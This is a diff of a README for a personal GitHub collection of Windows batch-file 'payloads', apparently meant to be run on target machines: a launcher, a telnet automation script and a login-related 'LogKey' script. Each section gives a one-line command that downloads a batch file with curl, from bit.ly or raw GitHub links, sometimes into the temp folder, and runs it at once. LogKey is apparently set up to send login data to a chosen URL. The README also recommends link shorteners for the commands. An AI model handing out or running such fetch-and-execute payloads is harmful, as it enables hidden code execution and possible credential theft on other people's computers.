@@ -1,15 +1,82 @@
 # Payloads
-A collection of my custom payloads for Windows.<br>
+A collection of my custom safe (...for now hehe) payloads for Windows.<br>
 Some payloads are for personal or educational use only and might not deliver the results you wanted.
 
-## Telkit
-[Telkit](https://github.com/Jed556/Payloads/blob/main/Telkit/telkit.bat) is a custom payload for telnet run automations.
+
+
+## Batchfiles
+Here are the individual batchfiles and how to use them.
+> **Warning** <br>
+> It is required to write the script into a file with different name **aside from r.bat** since r.bat is the default name that PLs.bat uses to name a payload it downloaded. If you want to use r.bat as the name of your manually downloaded payload, you may fork the repository and change the configuration variables inside PLs.bat.
+> For scripts that include `cd %temp% &` in the command, you may change **%temp%** to a different folder of your choice. Be sure to select a directory and make sure that the directory is accessible to avoid errors when running the script.
+
+
+
+### PLs.bat
+[**PLs**](https://github.com/Jed556/Payloads/blob/main/PLs.bat) is the boss. This is the main launcher and download manager for all payloads.<br>
+
+**Download and Run**
+You may add additional arguments to the end of the command. Please refer to the **Arguments** section for more information.
 ```Batch
-cmd /c cd %temp% & curl -Lo r.bat bit.ly/p-tk & r 1
+cmd /c curl -Lo pls.bat bit.ly/p-tk & pls
 ```
 
-## LogKey
-[LogKey](https://github.com/Jed556/Payloads/blob/main/Logkey/logkey.bat) is a custom payload for id login.
+**Arguments**
+Without arguments, or with missing arguments, the script will prompt you for the payload to run and the arguments to pass to it. The following table provides examples of how to run the script with different arguments:
+|Index|Example|Description|
+|:---:|:-----:|:--------- |
+|1|**pls 1**|Specifies the **index** of the payload to run (default: none).|
+|2|**pls 2 1**|Enables (**1**) or disables (**0**) debug mode (default: 0). This option will be passed to the specified payload.|
+|*|**pls 3 0 2**|Arguments starting from index 3 are passed to the specified payload. Check the argument list for the specific payload you want to run, and add 1 to the indexes to understand the indexing better.|
+
+
+
+### TelKit
+[**Telkit**](https://github.com/Jed556/Payloads/blob/main/Telkit/telkit.bat) is a custom payload for telnet run automations. <br>
+
+**Download and Run**
+You may add additional arguments to the end of the command. Please refer to the **Arguments** section for more information.
 ```Batch
-cmd /c cd %temp% & curl -Lo r.bat bit.ly/p-lk & r
+cmd /c cd %temp% & curl -Lo tk.bat raw.githubusercontent.com/Jed556/Payloads/main/TelKit/telkit.bat & tk
 ```
+
+**Arguments**
+|Index|Example|Description|
+|:---:|:-----:|:--------- |
+When arguments are missing or not provided, the script will prompt you for the telnet service to connect to. The following table provides examples of how to run the script with different arguments
+|1|**tk 0**|Enable (**1**) or disable (**0**) debug mode (default:0)|
+|2|**tk 1 1**|Specifies the index of the telnet service to connect to (default: none).|
+
+
+
+### LogKey
+[**LogKey**](https://github.com/Jed556/Payloads/blob/main/Logkey/logkey.bat) is a custom payload for id login. <br>
+
+**Download and Run**
+You may add additional arguments to the end of the command. Please refer to the **Arguments** section for more information.
+```Batch
+cmd /c curl -Lo lk.bat raw.githubusercontent.com/Jed556/Payloads/main/LogKey/logkey.bat & lk
+```
+
+**Arguments**
+This script currently only has one argument, which enables or disables debug mode. However, you can configure the script's variables to specify your own URL and data file name and path. In the future, additional arguments may be added, such as a custom URL or the ability to input data as a string.
+|Index|Example|Description|
+|:---:|:-----:|:--------- |
+|1|**lk 1**|Enable (**1**) or disable (**0**) debug mode (default:0)|
+
+
+
+> **Note** <br>
+> You may add `cd %temp% &` between `cmd /c` and `curl` for the files without a specific **cd** command to download and run inside Windows **%TEMP%** (temporary) folder.
+> You may change the file name *(ex. ***pls.bat***)* to a different name of your choice. Be sure to change the name of the file in the command *(& ***pls***)* as well.
+> You can adjust the individual configuration variables inside each script to your liking. Be sure to enter the correct values for the variables to avoid errors when running the script.
+
+
+
+## Shortcuts
+You may use link shorteners to shorten the commands. Here are some great link shorteners that you may use:<br>
+**Bitly**: [bitly.com](https://bitly.com/)<br>
+**Tinyurl**: [tinyurl.com](https://tinyurl.com/)<br>
+**Rebrandly**: [rebrand.ly](https://rebrand.ly/)<br>
+**Is.gd**: [is.gd](https://is.gd/)<br>
+> I recommend using [**Bitly**](https://bitly.com/) or [**Tinyurl**](https://tinyurl.com/) since they are the only ones that I have tested so far. <br>
